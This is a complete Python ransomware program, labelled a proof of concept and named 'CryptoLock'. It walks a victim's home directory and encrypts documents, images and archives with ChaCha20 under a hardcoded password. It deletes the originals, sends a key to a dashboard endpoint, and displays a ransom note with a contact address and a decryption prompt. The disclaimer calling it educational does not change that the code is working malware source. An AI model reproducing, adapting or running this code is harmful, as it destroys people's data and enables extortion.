#!/usr/bin/env python3

import os
import sys
import glob
import struct
import base64
import uuid
import json
import requests
import logging
import subprocess
from datetime import datetime

def install_pycryptodome():
    try:
        from Crypto.Cipher import ChaCha20
        print("pycryptodome is already installed.")
    except ImportError:
        print(" Installing pycryptodome...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", "pycryptodome"])
        
install_pycryptodome()
from Crypto.Cipher import ChaCha20
from Crypto.Protocol.KDF import PBKDF2
from Crypto.Random import get_random_bytes
import tkinter as tk
from tkinter import messagebox, simpledialog

# 리눅스 홈 디렉토리 기준 경로 설정
HOME_DIR = "/home/victim"
MACHINE_ID_PATH = os.path.join(HOME_DIR, "Machine_id.txt")
DASHBOARD_URL = 'http://localhost/prjrans/includes/api/receive_key.php'
EXTENSIONS_TO_ENCRYPT = ['.py','.txt', '.jpg', '.png', '.pdf', '.zip', '.rar', '.xlsx', '.docx','.jpeg']

# 로깅 설정
logging.basicConfig(
    filename='encryption_log.txt',
    level=logging.INFO,
    format='%(asctime)s:%(levelname)s:%(message)s',
    filemode='w'
)
console_handler = logging.StreamHandler()
console_handler.setLevel(logging.INFO)
formatter = logging.Formatter('%(asctime)s:%(levelname)s:%(message)s')
console_handler.setFormatter(formatter)
logging.getLogger().addHandler(console_handler)

class ChaCha20Encryptor:
    def __init__(self, password, dashboard_url):
        self.password = password
        self.dashboard_url = dashboard_url
        self.key = self.derive_key(password)
        self.machine_id = str(uuid.uuid4())

    def derive_key(self, password):
        salt = get_random_bytes(16)
        return PBKDF2(password.encode(), salt, dkLen=32, count=1000000)

    def encrypt_file(self, in_filename):
        try:
            salt = get_random_bytes(16)  # New: generate salt
            nonce = get_random_bytes(8)
            key = PBKDF2(self.password.encode(), salt, dkLen=32, count=1000000)
            cipher = ChaCha20.new(key=key, nonce=nonce)

            with open(in_filename, 'rb') as infile:
                data = infile.read()
            encrypted_data = cipher.encrypt(data)

            with open(in_filename + '.bitter', 'wb') as outfile:
                outfile.write(struct.pack('<Q', len(data)))  # original size
                outfile.write(salt)   # New: write salt first
                outfile.write(nonce)  # then nonce
                outfile.write(encrypted_data)

            os.remove(in_filename)
            logging.info(f"Encrypted: {in_filename}")
        except Exception as e:
            logging.error(f"Failed to encrypt {in_filename}: {e}")



    def encrypt_directory(self, path):
        for root, _, files in os.walk(path):
            if ('/proc' in root or '/dev' in root or '/sys' in root or '/run' in root):
                continue
            for file in files:
                if any(file.endswith(ext) for ext in EXTENSIONS_TO_ENCRYPT):
                    file_path = os.path.join(root, file)
                    self.encrypt_file(file_path)
                    

    def send_key_to_dashboard(self):
        encoded_key = base64.b64encode(self.key).decode('utf-8')
        payload = {'machine_id': self.machine_id, 'encryption_key': encoded_key}
        headers = {'Content-Type': 'application/json'}

        try:
            response = requests.post(self.dashboard_url, headers=headers, data=json.dumps(payload))
            if response.ok:
                logging.info("Key sent to dashboard successfully.")
            else:
                logging.error(f"Dashboard error: {response.status_code} {response.text}")
        except Exception as e:
            logging.error(f"Failed to send key to dashboard: {e}")

    def save_machine_id(self):
        try:
            with open(MACHINE_ID_PATH, 'w') as f:
                f.write(self.machine_id)
            logging.info(f"Machine ID saved to {MACHINE_ID_PATH}")
        except Exception as e:
            logging.error(f"Failed to save Machine ID: {e}")

def decrypt_file(password, in_filename):
    try:
        with open(in_filename, 'rb') as infile:
            origsize = struct.unpack('<Q', infile.read(8))[0]
            salt = infile.read(16)      # New: read salt
            nonce = infile.read(8)
            key = PBKDF2(password.encode(), salt, dkLen=32, count=1000000)
            cipher = ChaCha20.new(key=key, nonce=nonce)
            decrypted_data = cipher.decrypt(infile.read())

        out_filename = os.path.splitext(in_filename)[0]
        with open(out_filename, 'wb') as outfile:
            outfile.write(decrypted_data[:origsize])

        os.remove(in_filename)
        return True
    except Exception as e:
        logging.error(f"Failed to decrypt {in_filename}: {e}")
        return False



from tkinter import messagebox, simpledialog
from tkinter import ttk
from PIL import Image, ImageTk
from datetime import datetime, timedelta

# Step 2: Defining the resource path function
def resource_path(relative_path):
    base_path = os.path.dirname(os.path.abspath(__file__))
    return os.path.join(base_path, relative_path)

# Global constants for Linux version (PNG for icon)
ICON_PATH = resource_path("img/app_icon.png")
LOGO_PATH = resource_path("img/logo.png")
THANKS_PATH = resource_path("img/thank-you.png")

# Step 3: Creating Main Class for Decryptor App.
class DecryptorApp(tk.Tk):
    def __init__(self):
        super().__init__()
        try:
            icon_img = Image.open(ICON_PATH)
            self.iconphoto(False, ImageTk.PhotoImage(icon_img))
        except Exception as e:
            print(f"Icon load failed: {e}")

        self.title("CryptoLock")
        self.configure(bg='black')
        self.geometry("900x800")
        self.initialize_ui()

# Step 4: Creating Function to Initialize the UI Components.
    def initialize_ui(self):
        logo_image = Image.open(LOGO_PATH).resize((200, 200))
        logo_photo = ImageTk.PhotoImage(logo_image)
        frame = tk.Frame(self, bg='black')
        frame.pack(pady=(20, 20))

        logo_label = tk.Label(frame, image=logo_photo, bg='black')
        logo_label.image = logo_photo
        logo_label.pack(side=tk.LEFT, padx=(20, 10))

        ransom_note = """ | PROOF OF CONCEPT: RANSOMWARE SIMULATION | \n\n"""

        ransom_note_label = tk.Text(frame, bg='black', font=('Helvetica', 12), wrap='word', height=16, width=60, borderwidth=0)
        ransom_note_label.pack(side=tk.LEFT, padx=(10, 20))

        ransom_note_label.insert(tk.END, " Proof of Concept: Ransomware Simulation \n", "center_red")
        ransom_note_label.insert(tk.END, "| Attention: Your Files Are Encrypted | \n\n", "center_red")
        ransom_note_label.insert(tk.END, "This simulation is solely for educational purposes and must not be used maliciously.\n", "center_green")
        ransom_note_label.insert(tk.END, "Users are fully accountable for their actions.\n", "center_white")
        ransom_note_label.insert(tk.END, "Your files have been encrypted using state-of-the-art encryption algorithms. To restore access to your data, you must enter the decryption key.\n\n", "center_white")
        ransom_note_label.insert(tk.END, " ** To Recover Your Files:** \n", "center_yellow")
        ransom_note_label.insert(tk.END, "Ping Us at [ mykeys@cryptolock.xyz ]\n", "center_yellow")

        ransom_note_label.tag_configure("center", justify='center')
        ransom_note_label.tag_configure("center_red", justify='center', foreground="red")
        ransom_note_label.tag_configure("center_green", justify='center', foreground="green")
        ransom_note_label.tag_configure("center_white", justify='center', foreground="white")
        ransom_note_label.tag_configure("center_yellow", justify='center', foreground="yellow")

        ransom_note_label.tag_add("center", "1.0", "1.end")
        ransom_note_label.tag_add("center_red", "1.0", "2.end")
        ransom_note_label.tag_add("center_green", "4.0", "4.end")
        ransom_note_label.tag_add("center_white", "5.0", "6.end")
        ransom_note_label.tag_add("center_yellow", "8.0", "9.end")
        ransom_note_label.configure(state='disabled')

        self.setup_key_frame()
        self.setup_log_frame()
        self.setup_progress_frame()

# Step 6: Creating function for Setting up the frame for the decryption key input.
    def setup_key_frame(self):
        key_frame = tk.Frame(self, bg='black')
        key_frame.pack(fill=tk.X, padx=10, pady=(10, 5))
        self.key_entry = tk.Entry(key_frame, fg='black', font=('Helvetica', 12), bd=1, relief=tk.FLAT)
        self.key_entry.pack(fill=tk.X, side=tk.LEFT, expand=True, padx=(10, 0), ipady=8)
        tk.Button(key_frame, text="START DECRYPTION", bg='#d9534f', fg='white',
           font=('Helvetica', 12), relief=tk.FLAT,
           command=self.start_decryption).pack(side=tk.RIGHT, padx=(10, 0))

# Step 7: Creating Function for the logging message with banner.
    def setup_log_frame(self):
        log_frame = tk.Frame(self, bg='black')
        log_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)

        banner_text = "Welcome to CryptoLock - [HACKER MODE]"
        banner_label = tk.Label(log_frame, text=banner_text, fg='orange', bg='black', font=('Courier New', 12))
        banner_label.pack(side=tk.TOP, fill=tk.X)

        self.log_listbox = tk.Listbox(log_frame, height=6, width=50, bg='black', fg='#00FF00', font=('Courier New', 10))
        self.log_listbox.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)

        scrollbar = tk.Scrollbar(log_frame, orient="vertical", command=self.log_listbox.yview)
        scrollbar.pack(side="right", fill="y")
        self.log_listbox.config(yscrollcommand=scrollbar.set)

# Step 8: setting up the frame for decryption progress.
    def setup_progress_frame(self):
        self.progress_frame = tk.Frame(self, bg='black')
        self.progress_frame.pack(fill=tk.X, padx=10, pady=20)
        style = ttk.Style()
        style.theme_use('clam')
        style.configure("Enhanced.Horizontal.TProgressbar", troughcolor='black', background='green', thickness=20)
        self.progress = ttk.Progressbar(self.progress_frame, style="Enhanced.Horizontal.TProgressbar", orient=tk.HORIZONTAL, length=400, mode='determinate')
        self.progress.pack(fill=tk.X, expand=True)
        self.progress_label = tk.Label(self.progress_frame, text="Decryption Progress: 0%", bg='black', fg='white')
        self.progress_label.pack()
    
    def start_decryption(self):
        password = self.key_entry.get().strip()
        if not password:
            messagebox.showerror("Error", "Decryption key is required.")
            return

        decrypted_count = 0
        total_files = 0
        for root, _, files in os.walk(HOME_DIR):
            for file in files:
                if file.endswith('.bitter'):
                    total_files += 1

        progress = 0
        for root, _, files in os.walk(HOME_DIR):
            for file in files:
                if file.endswith('.bitter'):
                    path = os.path.join(root, file)
                    if decrypt_file(password, path):  # 변경된 부분
                        decrypted_count += 1
                        self.log_listbox.insert(tk.END, f"Decrypted: {path}")
                    else:
                        self.log_listbox.insert(tk.END, f"Failed to decrypt: {path}")
                    progress += 1
                    self.update_progress_bar(progress, total_files)

        if decrypted_count == total_files:
            messagebox.showinfo("Success", "All files decrypted successfully.")
        else:
            messagebox.showwarning("Partial", f"{decrypted_count}/{total_files} files decrypted.")

    def update_progress_bar(self, value, maximum):
        self.progress["value"] = value
        self.progress["maximum"] = maximum
        percentage = 100 * (value / maximum) if maximum else 0
        self.progress_label.config(text=f"Decryption Progress: {percentage:.2f}%")




if __name__ == "__main__":
    if not os.path.exists(MACHINE_ID_PATH):
        encryptor = ChaCha20Encryptor(password="PleaseGiveMeMoney", dashboard_url=DASHBOARD_URL)
        encryptor.encrypt_directory(HOME_DIR)
        encryptor.save_machine_id()
        encryptor.send_key_to_dashboard()

    app = DecryptorApp()
    app.mainloop()
